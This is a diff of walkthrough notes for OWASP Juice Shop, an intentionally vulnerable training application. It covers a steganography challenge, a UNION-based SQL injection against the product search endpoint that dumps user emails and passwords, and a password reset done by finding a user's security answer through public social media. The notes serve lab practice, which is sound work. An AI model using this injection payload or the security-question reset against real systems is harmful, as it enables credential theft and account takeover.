@@ -297,18 +297,22 @@ POST /rest/user/login HTTP/1.1<br>
 
 ### Steganography
 http://localhost:3000/#/about<br>
-firefox > inspect photo
-http://localhost:3000/assets/public/images/carousel/5.png
-sudo dpkg -i openstego_0.8.6-1_all.deb
-openstego > extract data
-http://localhost:3000/#/contact
-comment > pickle rick
+firefox > inspect photo <br>
+http://localhost:3000/assets/public/images/carousel/5.png<br>
+sudo dpkg -i openstego_0.8.6-1_all.deb<br>
+openstego > extract data<br>
+http://localhost:3000/#/contact<br>
+comment > pickle rick<br>
 
 ### User Credentials
-burp suite > proxy > repeater
-GET /rest/products/search?q=apple'))union%20select%20id,username,email,password,5,6,7,8,9%20from%20Users-- HTTP/1.1
+burp suite > proxy > repeater<br>
+GET /rest/products/search?q=apple'))union%20select%20id,username,email,password,5,6,7,8,9%20from%20Users-- HTTP/1.1<br>
 
-
+### Reset Uvogin Password
+http://localhost:3000/#/forgot-password<br>
+https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin
+email: uvogin@juice-sh.op<br>
+secret: Silence of the Lambs
 
 
 
